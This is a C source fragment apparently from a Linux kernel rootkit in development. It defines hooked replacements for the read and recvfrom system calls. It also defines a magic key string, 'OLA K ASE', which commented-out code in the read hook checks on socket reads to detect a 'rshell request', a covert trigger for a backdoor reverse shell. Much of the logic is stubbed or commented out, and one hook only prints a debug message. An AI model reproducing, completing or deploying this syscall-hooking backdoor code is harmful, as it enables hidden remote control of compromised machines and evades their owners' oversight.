asmlinkage int my_recvfrom64(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
	int ret = 0;

	//SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
	//ret = SYSCALL64(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
	return ret;
}

asmlinkage int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
    int ret = 0;

    SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
    //ret = SYSCALL32(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
    return ret;
}

#define RSHELL_KEY "OLA K ASE"

asmlinkage int my_read64(int fd, void *buf, size_t len) {
	int ret = 0, err = 0;
	struct socket *sock = NULL;
	char *my_buf = NULL;

	return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
//	f_printk("OLA\n");
	sock = f_sockfd_lookup(fd, &err);
	if (sock != NULL) {
		my_buf = f_kmalloc(len, GFP_KERNEL);
		if (my_buf == NULL) {
			return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
		}
		/*ret = SYSCALL64(__NR_read, fd, my_buf, len, 0, 0, 0);
		if (ret == sizeof(RSHELL_KEY) && f_strncmp(my_buf, RSHELL_KEY, ret) == 0) {
			f_printk("got rshell request!\n");
			f_kfree(my_buf);
			return my_read64(fd, buf, len);
		}
		f_probe_kernel_write(buf, my_buf, ret);
		*/
		ret = SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
		f_kfree(my_buf);
		return ret;
	} else {
		return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
	}
}

asmlinkage int my_read32(int fd, void *buf, size_t len) {
	return 0;
}
